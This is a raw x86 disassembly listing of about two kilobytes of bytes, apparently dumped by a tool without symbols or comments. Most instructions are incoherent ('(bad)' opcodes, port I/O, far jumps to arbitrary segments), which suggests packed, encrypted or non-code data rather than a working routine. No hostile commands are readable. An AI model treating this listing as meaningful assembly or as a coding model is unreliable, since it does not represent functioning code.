  412731:	repz xlat BYTE PTR ds:[ebx]
  412733:	push   esp
  412734:	test   DWORD PTR [ebp+0x4b],ebp
  412737:	pop    ebx
  412738:	add    al,0xae
  41273a:	sub    BYTE PTR [edi],dh
  41273c:	mov    ebp,0x162b704e
  412741:	aam    0x34
  412743:	jae    0x4126d9
  412745:	js     0x4127ba
  412747:	ins    BYTE PTR es:[edi],dx
  412748:	mov    BYTE PTR [edx+ecx*4+0x15],dl
  41274c:	retf   
  41274d:	fst    DWORD PTR cs:[ecx+0x41]
  412751:	pusha  
  412752:	adc    esp,DWORD PTR [edx*4+0x126a9447]
  412759:	cmp    al,0xf0
  41275b:	cmp    BYTE PTR [ecx-0x125048f1],0xc1
  412762:	pusha  
  412763:	or     BYTE PTR ds:0x32793c22,0xe4
  41276a:	cmp    bh,BYTE PTR [ecx+0xd]
  41276d:	sti    
  41276e:	or     edi,ecx
  412770:	pop    edx
  412771:	in     al,dx
  412772:	mov    dl,0x92
  412774:	rcl    ch,1
  412776:	mov    WORD PTR ds:[edi+0x5],cs
  41277a:	cmc    
  41277b:	xchg   esi,eax
  41277c:	adc    ch,BYTE PTR [ecx+0x1122598d]
  412782:	xor    DWORD PTR [ecx+0xc701a30],0xac9fd12c
  41278c:	or     edi,DWORD PTR [bp+di-0x6d0]
  412791:	or     edi,DWORD PTR [esi-0x3d]
  412794:	jno    0x412723
  412796:	mov    cl,0x13
  412798:	enter  0x3b9b,0xdc
  41279c:	in     al,dx
  41279d:	jmp    0xbebe:0xb39bec13
  4127a4:	push   cs
  4127a5:	in     eax,0x6a
  4127a7:	pop    ebx
  4127a8:	aam    0x3
  4127aa:	fidivr DWORD PTR [edi]
  4127ac:	mov    ds:0xac66bbb,al
  4127b1:	out    0xd8,eax
  4127b3:	mov    esi,0x81acc1a5
  4127b8:	sub    esi,0x44
  4127bb:	retf   
  4127bc:	cmp    BYTE PTR [ecx],al
  4127be:	dec    di
  4127c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127c1:	leave  
  4127c2:	imul   esi,DWORD PTR [edx],0xfc25a1d0
  4127c8:	mov    esp,0xb4dcfea8
  4127cd:	push   DWORD PTR [ebx-0x4d]
  4127d0:	data16 and al,0x9f
  4127d3:	ror    dh,0x37
  4127d6:	xchg   BYTE PTR [eax+0x70c02895],cl
  4127dc:	in     eax,dx
  4127dd:	mov    eax,ds:0x434b66ff
  4127e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127e3:	in     eax,dx
  4127e4:	sbb    eax,0x6ce5dce4
  4127e9:	imul   ebx,esi,0x15
  4127ec:	lock cld 
  4127ee:	jno    0x41284f
  4127f0:	or     al,0xd
  4127f2:	xor    bl,0xca
  4127f5:	push   ss
  4127f6:	(bad)  
  4127f7:	cdq    
  4127f8:	inc    esp
  4127f9:	data16 cmp dl,ch
  4127fc:	bnd jae 0x4127d3
  4127ff:	stc    
  412800:	xor    eax,0xcb669cc4
  412805:	ret    
  412806:	inc    edx
  412807:	aaa    
  412808:	bound  ecx,QWORD PTR [eax+0x38]
  41280b:	cld    
  41280c:	sub    al,0xd0
  41280e:	mov    al,ds:0x2349866c
  412813:	push   ss
  412814:	or     al,0xc8
  412816:	pusha  
  412817:	mov    dh,0x8
  412819:	loope  0x4127b0
  41281b:	jne    0x601988dc
  412821:	add    al,0xd5
  412823:	xor    dl,BYTE PTR [esp+ecx*2+0x5f]
  412827:	sbb    al,dh
  412829:	mov    ds:0x7cf26acf,eax
  41282e:	shr    DWORD PTR [edx],1
  412830:	(bad)  
  412831:	mov    al,0xbd
  412833:	(bad)
  412836:	xchg   DWORD PTR [ebp+0x33],ebx
  412839:	outs   dx,BYTE PTR ds:[esi]
  41283a:	jmp    0x59ee:0x393b9fe
  412841:	lods   eax,DWORD PTR ds:[esi]
  412842:	int    0xfa
  412844:	sub    BYTE PTR [edi+0x2],dl
  412847:	mov    bh,0xa5
  412849:	jbe    0x4128c9
  41284b:	sub    eax,0xed0e643f
  412850:	repnz push cs
  412852:	sub    BYTE PTR [ebp-0x65ac6259],bh
  412858:	jmp    0x66e676b3
  41285d:	loope  0x41285d
  41285f:	mov    ebp,0xc7fb6c68
  412864:	data16 add al,0x9c
  412867:	test   edx,esp
  412869:	xchg   DWORD PTR [ebp-0xa3634d8],esp
  41286f:	sar    DWORD PTR [ecx+edi*1+0x1c],cl
  412873:	xchg   edx,eax
  412874:	xchg   ebp,eax
  412875:	jb     0x4128f4
  412877:	sbb    al,0xf8
  412879:	push   ebx
  41287a:	or     eax,0x700d33be
  41287f:	dec    si
  412881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412882:	(bad)  
  412883:	or     BYTE PTR [ecx+eax*4-0x2b1d2f9e],0xe4
  41288b:	xchg   ebx,eax
  41288c:	dec    esp
  41288d:	int3   
  41288e:	or     ebx,esp
  412890:	xchg   DWORD PTR [edx-0x2515d416],ebp
  412896:	dec    edx
  412897:	fild   QWORD PTR ds:0xb20786ac
  41289d:	repnz mov ecx,0xa91856c4
  4128a3:	sbb    BYTE PTR [eax+ecx*4-0x47a4602e],0xaa
  4128ab:	mov    eax,0xeada70aa
  4128b0:	dec    ebp
  4128b1:	mov    WORD PTR [ebp-0x4227ad47],ds
  4128b7:	rcl    ebp,1
  4128b9:	cmp    DWORD PTR [edx-0x15f8956b],ebx
  4128bf:	and    eax,0x6d251652
  4128c4:	(bad)  
  4128c5:	pop    ss
  4128c6:	inc    ecx
  4128c7:	or     BYTE PTR [edx+0x7b],ah
  4128ca:	dec    esi
  4128cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128cc:	lods   eax,DWORD PTR ds:[esi]
  4128cd:	push   ecx
  4128ce:	push   ds
  4128cf:	pop    ss
  4128d0:	mov    ebx,eax
  4128d2:	repz aad 0x9c
  4128d5:	cs fwait
  4128d7:	(bad)  
  4128d8:	(bad)  
  4128d9:	rcr    DWORD PTR [edi-0x38],0x78
  4128dd:	rcr    DWORD PTR [ecx-0x1f69d73c],1
  4128e3:	clc    
  4128e4:	cs dec ecx
  4128e6:	inc    ebx
  4128e7:	lods   eax,DWORD PTR ds:[esi]
  4128e8:	jge    0x4128a5
  4128ea:	adc    BYTE PTR [bx-0x25f3],0x4f
  4128f0:	mov    bh,0xf0
  4128f2:	push   ss
  4128f3:	jns    0x4128fc
  4128f5:	xchg   edx,eax
  4128f6:	sbb    BYTE PTR [ecx],bl
  4128f8:	mov    al,ds:0xe415e1a3
  4128fd:	jne    0x41295d
  4128ff:	or     bl,bl
  412901:	hlt    
  412902:	jnp    0x412914
  412904:	sti    
  412905:	ins    DWORD PTR es:[edi],dx
  412906:	mov    esi,0xfafbf3d3
  41290b:	(bad)  
  41290c:	rcr    DWORD PTR [esi],1
  41290e:	add    BYTE PTR [ecx-0x7e6f7358],dl
  412914:	fcom   QWORD PTR [edi-0x10]
  412917:	jg     0x412930
  412919:	(bad)  
  41291a:	aad    0xdc
  41291c:	push   ecx
  41291d:	push   edi
  41291e:	sbb    eax,0x4a8582a1
  412923:	icebp  
  412924:	pop    ds
  412925:	sbb    BYTE PTR [ebx-0x8],ch
  412928:	pop    eax
  412929:	mov    BYTE PTR [ecx+0x4b],bl
  41292c:	xor    DWORD PTR [esi],ebx
  41292e:	cdq    
  41292f:	mov    eax,0x462b1129
  412934:	fidivr WORD PTR [edx-0x19]
  412937:	cdq    
  412938:	shl    BYTE PTR [eax-0x55],1
  41293b:	pop    ebx
  41293c:	rcl    BYTE PTR [edx],cl
  41293e:	inc    esp
  41293f:	sub    eax,DWORD PTR [ecx-0x16296538]
  412945:	xor    al,0xc5
  412947:	jle    0x4128ca
  412949:	lds    ebp,FWORD PTR [eax+eax*2-0x1a]
  41294d:	jne    0x412961
  41294f:	icebp  
  412950:	jmp    0x5f670932
  412955:	rcr    BYTE PTR [eax+0x3],0xe4
  412959:	scas   al,BYTE PTR es:[edi]
  41295a:	mov    ds:0x44e3c2e9,eax
  41295f:	fist   DWORD PTR [edi-0x28]
  412962:	cmp    edx,ebx
  412964:	sub    al,0x8
  412966:	icebp  
  412967:	cmp    edi,eax
  412969:	out    0xd0,al
  41296b:	jmp    0xe434:0x4d8a5f33
  412972:	xor    al,BYTE PTR [esi-0x1c09b7ab]
  412978:	pop    ebp
  412979:	sbb    al,0x8a
  41297b:	and    ebp,DWORD PTR [edx+0x19]
  41297e:	(bad)  
  41297f:	lods   al,BYTE PTR ds:[esi]
  412980:	test   al,0x7a
  412982:	rol    BYTE PTR [eax],0x44
  412985:	jl     0x4129b9
  412987:	dec    ebx
  412988:	ss popa 
  41298a:	leave  
  41298b:	or     ecx,DWORD PTR [edx+0xa]
  41298e:	and    al,0x2e
  412990:	pop    es
  412991:	fidiv  WORD PTR [ebp+edx*2+0x6d7cb6d6]
  412998:	test   eax,0xe144cb75
  41299d:	hlt    
  41299e:	psadbw mm6,QWORD PTR [ebp-0x371c807b]
  4129a5:	or     dl,BYTE PTR ds:0xd17589c0
  4129ab:	inc    ebp
  4129ac:	mov    BYTE PTR [esi-0x6d],dl
  4129af:	mov    al,0xb
  4129b1:	xchg   ebp,eax
  4129b2:	inc    ecx
  4129b3:	xchg   DWORD PTR [edx],ebp
  4129b5:	inc    eax
  4129b6:	pushf  
  4129b7:	fsub   QWORD PTR ds:0x9638422
  4129bd:	push   eax
  4129be:	jb     0x4129c1
  4129c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129c1:	lods   al,BYTE PTR ds:[esi]
  4129c2:	aam    0xa7
  4129c4:	call   0x2095c3b3
  4129c9:	adc    al,0xbf
  4129cb:	ret    0xba08
  4129ce:	mov    al,ds:0x7c35c633
  4129d3:	lods   al,BYTE PTR ds:[esi]
  4129d4:	xor    ah,ch
  4129d6:	xchg   al,al
  4129d8:	xchg   ebx,eax
  4129d9:	je     0x41298c
  4129db:	call   0x90e:0xc5572cef
  4129e2:	jecxz  0x4129cd
  4129e4:	jns    0x412a52
  4129e6:	loopne 0x4129d7
  4129e8:	jae    0x4129ec
  4129ea:	jmp    0xce7dd7f1
  4129ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129f0:	adc    DWORD PTR fs:[esi+0x57bb8f7c],edi
  4129f7:	push   edi
  4129f8:	fnstenv [ebx-0x5be1e7b5]
  4129fe:	adc    dh,BYTE PTR ds:0x30be1571
  412a04:	jp     0x412a78
  412a06:	icebp  
  412a07:	xor    BYTE PTR [eax-0x77],bh
  412a0a:	(bad)  [eax]
  412a0c:	test   al,0xf2
  412a0e:	ss out 0xf8,al
  412a11:	xchg   ecx,eax
  412a12:	gs pop ebx
  412a14:	jae    0x412a4d
  412a16:	mov    ecx,0xf72f390
  412a1b:	add    eax,0x75b0b169
  412a20:	xor    al,0x85
  412a22:	dec    esi
  412a23:	cmp    BYTE PTR [esp+edx*1+0x25e54a42],0xd6
  412a2b:	imul   esp,DWORD PTR [eax],0x9ceb0cae
  412a31:	dec    ebx
  412a32:	jne    0x412a27
  412a34:	jmp    0x412a38
  412a36:	adc    eax,0xe85362b4
  412a3b:	jecxz  0x412a51
  412a3d:	mov    esi,0x90c77f90
  412a42:	ins    BYTE PTR es:[edi],dx
  412a43:	add    dh,BYTE PTR [ebx+esi*8+0x1af7a84]
  412a4a:	in     eax,dx
  412a4b:	pop    esi
  412a4c:	or     ch,BYTE PTR [eax-0xf620cc8]
  412a52:	(bad)  
  412a53:	mov    bh,0xd0
  412a55:	in     eax,0x7b
  412a57:	mov    esi,0x2dec50c5
  412a5c:	imul   BYTE PTR [eax+0x23]
  412a5f:	pop    edi
  412a60:	pop    ss
  412a61:	mov    ah,0xf1
  412a63:	lods   eax,DWORD PTR ds:[esi]
  412a64:	mov    esi,0x3b85ec3e
  412a69:	in     al,0x9e
  412a6b:	fs mov esp,0x17bafb79
  412a71:	adc    al,0xf6
  412a73:	add    bh,BYTE PTR [esi+0x26]
  412a76:	mov    esp,0x236b61a
  412a7b:	pop    ebp
  412a7c:	cmp    dl,dl
  412a7e:	adc    DWORD PTR [esi+0x116e0a1f],ebx
  412a84:	xchg   DWORD PTR [ecx],ecx
  412a86:	adc    BYTE PTR [eax-0x19],dh
  412a89:	jl     0x412a72
  412a8b:	cmc    
  412a8c:	pop    ecx
  412a8d:	into   
  412a8e:	adc    edi,DWORD PTR [ebx]
  412a90:	imul   esi,DWORD PTR [ebx-0x67],0xa0e797b9
  412a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a98:	inc    edi
  412a99:	lds    edx,FWORD PTR [ebp-0x3a9dd9b]
  412a9f:	xlat   BYTE PTR ds:[ebx]
  412aa0:	add    eax,0xf4b1eb6c
  412aa5:	std    
  412aa6:	push   edi
  412aa7:	push   0xc80a60c1
  412aac:	and    al,0x8a
  412aae:	lods   eax,DWORD PTR ds:[esi]
  412aaf:	jne    0x412a89
  412ab1:	xor    BYTE PTR [ebx-0x14],dh
  412ab4:	mov    edx,0x5c98cb07
  412ab9:	hlt    
  412aba:	(bad)  
  412abb:	push   esi
  412abc:	xchg   ebx,eax
  412abd:	xchg   esi,eax
  412abe:	xor    al,0xec
  412ac0:	or     esp,DWORD PTR [eax+eax*8+0x62642530]
  412ac7:	or     eax,eax
  412ac9:	dec    esp
  412aca:	adc    al,0xe9
  412acc:	inc    ebx
  412acd:	int3   
  412ace:	sub    cl,BYTE PTR [edx]
  412ad0:	test   eax,0x40304cfd
  412ad5:	fmul   st(5),st
  412ad7:	pop    es
  412ad8:	or     BYTE PTR [ecx+0x51],0xb8
  412adc:	dec    eax
  412add:	sahf   
  412ade:	pop    ebp
  412adf:	data16 adc BYTE PTR ds:0xef4f7b6c,0xe3
  412ae7:	and    dl,cl
  412ae9:	pop    edi
  412aea:	and    dh,bh
  412aec:	std    
  412aed:	sbb    ebp,esp
  412aef:	int    0x18
  412af1:	xor    ebp,DWORD PTR [ecx+0x72]
  412af4:	scas   eax,DWORD PTR es:[edi]
  412af5:	scas   eax,DWORD PTR es:[edi]
  412af6:	mov    eax,ds:0x9d100652
  412afb:	pop    eax
  412afc:	inc    ebp
  412afd:	ret    0x7abe
  412b00:	stc    
  412b01:	dec    esp
  412b02:	fxch   st(7)
  412b04:	add    bl,dl
  412b06:	imul   edi,DWORD PTR [edi],0xfbf7bf64
  412b0c:	add    esi,esp
  412b0e:	out    dx,eax
  412b0f:	add    DWORD PTR [edi-0x568eb28a],0x3a
  412b16:	fst    DWORD PTR ds:0xa4239a49
  412b1c:	jle    0x412b3f
  412b1e:	loope  0x412aa5
  412b20:	les    edx,FWORD PTR [edx-0x5fcc2f6e]
  412b26:	xchg   ebp,eax
  412b27:	cld    
  412b28:	out    0x76,eax
  412b2a:	popa   
  412b2b:	push   ecx
  412b2c:	iret   
  412b2d:	sub    eax,0xbaa515d0
  412b32:	push   ecx
  412b33:	cs mov ah,0x95
  412b36:	rcr    BYTE PTR [ebp-0x4b6efa3a],cl
  412b3c:	test   BYTE PTR [eax],dl
  412b3e:	jecxz  0x412b7b
  412b40:	xor    ebp,DWORD PTR [ebx-0x460b61eb]
  412b46:	xchg   ecx,eax
  412b47:	sar    BYTE PTR [ecx+0x67],1
  412b4a:	sti    
  412b4b:	sar    BYTE PTR ds:0x4c047492,cl
  412b51:	push   0x48
  412b53:	shl    DWORD PTR [eax+0x269a12c5],cl
  412b59:	mov    edx,0x769d1428
  412b5e:	arpl   dx,cx
  412b60:	retf   0x75aa
  412b63:	pusha  
  412b64:	add    eax,0xb574fde3
  412b69:	jecxz  0x412bb2
  412b6b:	test   al,0x65
  412b6d:	in     eax,dx
  412b6e:	stc    
  412b6f:	mov    bl,0x14
  412b71:	and    eax,edx
  412b73:	div    BYTE PTR [edx]
  412b75:	aam    0xe3
  412b77:	mov    bh,0x82
  412b79:	jecxz  0x412b42
  412b7b:	push   edx
  412b7c:	stos   DWORD PTR es:[edi],eax
  412b7d:	pop    ebp
  412b7e:	hlt    
  412b7f:	mov    cl,0xe9
  412b81:	lods   eax,DWORD PTR ds:[esi]
  412b82:	cwde   
  412b83:	add    eax,DWORD PTR [ebp-0x24720ccf]
  412b89:	mov    ch,0xe1
  412b8b:	cmp    dh,cl
  412b8d:	scas   al,BYTE PTR es:[edi]
  412b8e:	inc    edi
  412b8f:	stos   BYTE PTR es:[edi],al
  412b90:	jno    0x412b5a
  412b92:	pop    es
  412b93:	(bad)  
  412b94:	xlat   BYTE PTR ds:[ebx]
  412b95:	arpl   ax,sp
  412b97:	mov    BYTE PTR [edi],bh
  412b99:	fmul   st(4),st
  412b9b:	ret    
  412b9c:	mov    ecx,0x66dec572
  412ba1:	sub    BYTE PTR [ebp+0x40d7669e],ah
  412ba7:	adc    al,dl
  412ba9:	lahf   
  412baa:	dec    edi
  412bab:	add    BYTE PTR [esi],ah
  412bad:	mov    ?,WORD PTR [esi]
  412baf:	imul   esi,DWORD PTR [ecx+edx*4],0x54ee3fa6
  412bb6:	cmp    al,0x22
  412bb8:	arpl   bx,dx
  412bba:	cmp    BYTE PTR [ebx+ecx*8],0x9f
  412bbe:	shl    DWORD PTR [ebx+0x6f],0x9d
  412bc2:	xchg   BYTE PTR [eax-0x2432d3a1],ah
  412bc8:	mov    DWORD PTR [esp+ebx*1],ecx
  412bcb:	stos   BYTE PTR es:[edi],al
  412bcc:	mov    al,bh
  412bce:	mov    ds:0x97e3972b,eax
  412bd3:	mov    BYTE PTR [eax],ch
  412bd5:	dec    esi
  412bd6:	mov    al,BYTE PTR [edi+0x5f]
  412bd9:	cmp    dl,BYTE PTR [ebx+0x37]
  412bdc:	into   
  412bdd:	adc    al,0xd9
  412bdf:	ds fwait
  412be1:	shl    DWORD PTR [edi+0x9],cl
  412be4:	cld    
  412be5:	add    ecx,ecx
  412be7:	sbb    DWORD PTR [esi],0x8f0ca973
  412bed:	push   edi
  412bee:	dec    edx
  412bef:	jmp    0x3c1c2d2d
  412bf4:	jno    0x412baf
  412bf6:	outs   dx,BYTE PTR ds:[esi]
  412bf7:	lahf   
  412bf8:	out    dx,eax
  412bf9:	and    DWORD PTR [ebx+0xaa9e75f],ecx
  412bff:	int3   
  412c00:	and    BYTE PTR [esi-0x377aeb58],ah
  412c06:	pop    ebx
  412c07:	mov    al,0xd1
  412c09:	(bad)  
  412c0c:	gs ret 
  412c0e:	enter  0x254a,0x2b
  412c12:	int    0x1f
  412c14:	adc    ebp,edi
  412c16:	loop   0x412c76
  412c18:	imul   BYTE PTR [eax-0x2741d1fa]
  412c1e:	push   eax
  412c1f:	sub    BYTE PTR [ecx-0x6fcc58ac],ch
  412c25:	add    dh,dh
  412c27:	ss push ecx
  412c29:	fidivr WORD PTR [esi]
  412c2b:	fdivr  DWORD PTR ds:0x1bd0de2c
  412c31:	in     al,dx
  412c32:	xchg   ebx,eax
  412c33:	xchg   ebp,eax
  412c34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c35:	fsub   st(6),st
  412c37:	mov    ecx,0xb0fe5dc5
  412c3c:	inc    ebp
  412c3d:	cmp    ecx,eax
  412c3f:	sub    edx,DWORD PTR [eax+0x14]
  412c42:	add    al,0x26
  412c44:	repnz add cl,bh
  412c47:	adc    esp,ebx
  412c49:	pop    eax
  412c4a:	test   al,0xdd
  412c4c:	push   ds
  412c4d:	mov    dl,0x7c
  412c4f:	fdiv   DWORD PTR [ebx+0x6da3c756]
  412c55:	mov    eax,0x55cfffca
  412c5a:	jnp    0x412c75
  412c5c:	xor    BYTE PTR [ecx],0x59
  412c5f:	xor    eax,0xce560f49
  412c64:	push   esi
  412c65:	jne    0x412c8c
  412c67:	bound  esi,QWORD PTR [ebx+0x14]
  412c6a:	cld    
  412c6b:	addr16 data16 loopne 0x412c4f
  412c6f:	shl    DWORD PTR [ecx-0x55],0x7d
  412c73:	inc    DWORD PTR [ebp+0x7741eb53]
  412c79:	fwait
  412c7a:	ins    DWORD PTR es:[edi],dx
  412c7b:	es jmp 0x57da:0x98951d7
  412c83:	in     al,dx
  412c84:	xor    al,0xf5
  412c86:	addr16 mov dh,0xcf
  412c89:	mov    ah,bl
  412c8b:	push   es
  412c8c:	sub    eax,ecx
  412c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c8f:	xchg   esi,eax
  412c90:	in     eax,dx
  412c91:	jle    0x412c26
  412c93:	jge    0x412c8d
  412c95:	shr    bl,cl
  412c97:	loopne 0x412cc0
  412c99:	icebp  
	...
  412d12:	add    BYTE PTR [eax],al
  412d14:	aam    0xff
  412d16:	in     eax,dx
  412d17:	jp     0x412d08
  412d19:	jp     0x412cf2
  412d1b:	(bad)  
  412d1c:	jnp    0x412d5a
  412d1e:	adc    ecx,DWORD PTR [esi+0x66]
  412d21:	xchg   esp,eax
  412d22:	push   ebx
  412d23:	sbb    esp,DWORD PTR [edi+0x6e0000d5]
  412d29:	pop    es
  412d2a:	add    BYTE PTR [eax],al
  412d2c:	sbb    bh,BYTE PTR [edi+0x6b]
  412d2f:	repnz sti 
  412d31:	dec    esi
  412d32:	loopne 0x412cc8
  412d34:	scas   al,BYTE PTR es:[edi]
  412d35:	stc    
  412d36:	cwde   
  412d37:	xor    DWORD PTR [edx-0x1],0xffffff94
  412d3b:	inc    ecx
  412d3c:	xor    edx,ebp
  412d3e:	add    edi,DWORD PTR [edi+0x61a0f13]
  412d44:	stc    
  412d45:	enter  0x152b,0x98
  412d49:	(bad)  
  412d4a:	aas    
  412d4b:	sar    DWORD PTR [esi-0x6121fd84],cl
  412d51:	(bad)  
  412d53:	ss mov eax,0xaffc08f
  412d59:	mov    bl,0xfe
  412d5b:	popa   
  412d5c:	dec    eax
  412d5d:	cmc    
  412d5e:	sbb    BYTE PTR [ebp-0x92dd4a3],dl
  412d64:	rol    BYTE PTR [edx],cl
  412d66:	das    
  412d67:	pop    ebp
  412d68:	push   edx
  412d69:	iret   
  412d6a:	fs mov esp,0x8aba5451
  412d70:	push   edx
  412d71:	mov    esi,0x1c3e9858
  412d76:	sbb    al,0xac
  412d78:	inc    ebx
  412d79:	mov    ah,0x5f
  412d7b:	test   BYTE PTR [ebp+0x2b16db09],0x7f
  412d82:	xlat   BYTE PTR ds:[ebx]
  412d83:	sbb    DWORD PTR [ecx-0x14ff49c1],esp
  412d89:	jbe    0x412d81
  412d8b:	ret    
  412d8c:	aaa    
  412d8d:	push   ds
  412d8e:	cwde   
  412d8f:	mov    edx,0x5775db6a
  412d94:	sbb    ch,0x40
  412d97:	sub    ebx,esp
  412d99:	jle    0x412d2a
  412d9b:	jo     0x412d21
  412d9d:	jmp    0x412d28
  412d9f:	jbe    0x412e12
  412da1:	shr    BYTE PTR [ebx-0x5b],1
  412da4:	push   eax
  412da5:	push   ebp
  412da6:	ss mov bl,0x3b
  412da9:	rol    DWORD PTR [ebx-0x6f],1
  412dac:	lods   eax,DWORD PTR ds:[esi]
  412dad:	push   eax
  412dae:	imul   ecx,DWORD PTR [edi+0x9],0xe4907e32
  412db5:	cwde   
  412db6:	xchg   ebp,eax
  412db7:	mov    dl,0xd6
  412db9:	pop    esi
  412dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dbb:	imul   ebx,edx,0xa179f1bc
  412dc1:	inc    edx
  412dc2:	div    DWORD PTR [edi-0x2385a039]
  412dc8:	xor    eax,0xc806ecd9
  412dcd:	je     0x412ddb
  412dcf:	test   BYTE PTR [eax],ch
  412dd1:	mov    cl,0x20
  412dd3:	push   ebx
  412dd4:	push   ebx
  412dd5:	inc    esi
  412dd6:	sub    ecx,ebx
  412dd8:	hlt    
  412dd9:	mov    edi,0x5d38369b
  412dde:	mov    dl,cl
  412de0:	sbb    eax,0x17e11b44
  412de5:	xor    DWORD PTR [ebp+0x33],edx
  412de8:	sub    eax,0x899cbfe1
  412ded:	addr16 pop es
  412def:	add    al,0x7e
  412df1:	leave  
  412df2:	push   0xbdfcac51
  412df7:	xor    DWORD PTR [esp+eiz*2+0x40],ecx
  412dfb:	(bad)  
  412dfc:	gs or  al,0xf2
  412dff:	repnz push edi
  412e01:	jae    0x412dbc
  412e03:	pop    ecx
  412e04:	and    cl,0x65
  412e07:	ret    0x9635
  412e0a:	jle    0x412e46
  412e0c:	mov    ch,0xfc
  412e0e:	in     eax,dx
  412e0f:	int    0xbb
  412e11:	pop    esp
  412e12:	sub    DWORD PTR [esi-0x18e42416],0x8bb90d5b
  412e1c:	jae    0x412df2
  412e1e:	mov    ah,0x11
  412e20:	cs pop ecx
  412e22:	sub    al,0x7c
  412e24:	pop    edx
  412e25:	xchg   esp,eax
  412e26:	pusha  
  412e27:	jmp    0x7cec:0x427cdf6c
  412e2e:	punpckldq mm0,DWORD PTR [edx-0x5a2a3968]
  412e35:	add    DWORD PTR [esi+edi*8-0x2da24177],edx
  412e3c:	or     eax,DWORD PTR [esi]
  412e3e:	mov    edx,0xaadf1063
  412e43:	dec    edi
  412e44:	dec    edx
  412e46:	les    ebx,FWORD PTR [edi+0x65]
  412e49:	in     al,0x39
  412e4b:	and    BYTE PTR [edx],dl
  412e4d:	outs   dx,BYTE PTR ds:[esi]
  412e4e:	dec    esp
  412e4f:	fist   DWORD PTR [edx]
  412e51:	icebp  
  412e52:	dec    ebp
  412e53:	xor    DWORD PTR [esi-0x4e],0xaa2146c
  412e5a:	dec    esi
  412e5b:	cwde   
  412e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e5d:	aas    
  412e5e:	out    0xec,eax
  412e60:	sbb    bl,BYTE PTR [edi]
  412e62:	cmp    DWORD PTR ds:0x3a43c619,eax
  412e68:	out    0x48,eax
  412e6a:	pop    ecx
  412e6b:	sub    eax,0x6d2b5409
  412e70:	sbb    bl,cl
  412e72:	in     al,0x64
  412e74:	ds loop 0x412eba
  412e77:	pop    eax
  412e78:	scas   eax,DWORD PTR es:[edi]
  412e79:	cld    
  412e7a:	mov    BYTE PTR [edx-0x558ac812],al
  412e80:	jecxz  0x412e49
  412e82:	(bad)  
  412e83:	mov    ah,0xdf
  412e85:	ss int 0xcb
  412e88:	mov    ds:0x4e723658,al
  412e8d:	(bad)  
  412e8e:	es sub al,0xff
  412e91:	mov    eax,ds:0xb624c3e2
  412e96:	lds    edx,FWORD PTR [esi]
  412e98:	inc    ebx
  412e99:	adc    BYTE PTR [edx+0x6cd3c68a],al
  412e9f:	dec    bl
  412ea1:	ret    
  412ea2:	std    
  412ea3:	fadd   st,st(2)
  412ea5:	sub    DWORD PTR [esi],esp
  412ea7:	(bad)  
  412ea8:	fsubr  st(0),st
  412eaa:	aaa    
  412eab:	jns    0x412ef7
  412ead:	mov    al,ds:0x4b640706
  412eb2:	jp     0x412f00
  412eb4:	add    al,0x7
  412eb6:	add    BYTE PTR [edx],0x91
  412eb9:	pop    es
  412eba:	rcl    BYTE PTR [ebx],1
  412ebc:	sbb    eax,0xdb083cb5
  412ec1:	aaa    
  412ec2:	inc    eax
  412ec3:	sahf   
  412ec4:	push   es
  412ec5:	not    DWORD PTR ds:0xf3bc5c26
  412ecb:	pushf  
  412ecc:	call   0x889e9b34
  412ed1:	gs ins BYTE PTR es:[edi],dx
  412ed3:	(bad)  
  412ed4:	jmp    0x412e8b
  412ed6:	loope  0x412f53
  412ed8:	jmp    0xd5a1a5c6
  412edd:	pop    esi
  412ede:	neg    DWORD PTR [ebx-0x23]
  412ee1:	mov    WORD PTR [edi-0x62],fs
  412ee4:	aad    0x8d
  412ee6:	imul   ecx,edx,0x74
  412ee9:	and    DWORD PTR [esi],0x7994a24f
  412eef:	inc    ecx
  412ef0:	adc    al,0xea
  412ef2:	pusha  
  412ef3:	mov    ah,0xcc
  412ef5:	jne    0x412f76
  412ef7:	scas   eax,DWORD PTR es:[edi]
  412ef8:	gs cmp ecx,ebp
  412efb:	mov    WORD PTR [edi-0x6d],es
  412efe:	aad    0x1f
  412f00:	ret    
  412f01:	test   DWORD PTR [ecx+0x3e51e7e1],eax
  412f07:	loopne 0x412e90
  412f09:	stos   BYTE PTR es:[edi],al
  412f0a:	(bad)  
  412f0b:	pushf  
  412f0c:	dec    esp
  412f0d:	adc    ah,ch
  412f0f:	sub    BYTE PTR [edx-0x5d],ah
  412f12:	sbb    bh,BYTE PTR [edx-0x44]
  412f15:	popa   
  412f16:	lods   al,BYTE PTR ds:[esi]
  412f17:	xor    edx,esp
  412f19:	or     esp,esi
  412f1b:	jns    0x412f81
  412f1d:	jmp    0x3b262ed9
  412f22:	pop    edx
  412f23:	sbb    DWORD PTR [ecx],ecx
  412f25:	mov    esp,DWORD PTR ss:[edi]
  412f28:	jp     0x412f6f
  412f2a:	pushfw 
  412f2c:	inc    edx
  412f2d:	into   
  412f2e:	es dec edx
  412f30:	fidivr WORD PTR [eax-0xe]
  412f33:	mov    esi,0xe1315cd0
  412f38:	xchg   ebx,eax
  412f39:	mov    ecx,0xe8dc3ac2
  412f3e:	or     eax,0x68cfc49d
  412f43:	mov    ebp,0xd345ee4f
  412f48:	mov    BYTE PTR [eax],al
  412f4a:	pop    ebp
  412f4b:	imul   ecx,DWORD PTR [eax-0x23],0x9dcb6dba
  412f52:	test   al,0xb8
  412f54:	in     eax,0x22
  412f56:	mov    eax,ds:0x5a44c3b4
  412f5b:	pop    ebx
  412f5c:	push   ss
  412f5d:	mov    ss,WORD PTR [ebp-0x36]
  412f60:	gs sub al,0x1f
  412f63:	jge    0x412fa3
  412f65:	loope  0x412f2b
  412f67:	js     0x412f88
  412f69:	in     eax,0x93
  412f6b:	jg     0x412efc
  412f6d:	push   esp
  412f6e:	aad    0x4a
  412f70:	int3   
  412f71:	push   cs
  412f72:	jmp    0x8d817889
  412f77:	mov    cl,0x89
  412f79:	out    0x93,al
  412f7b:	cdq    
  412f7c:	jb     0x412f39
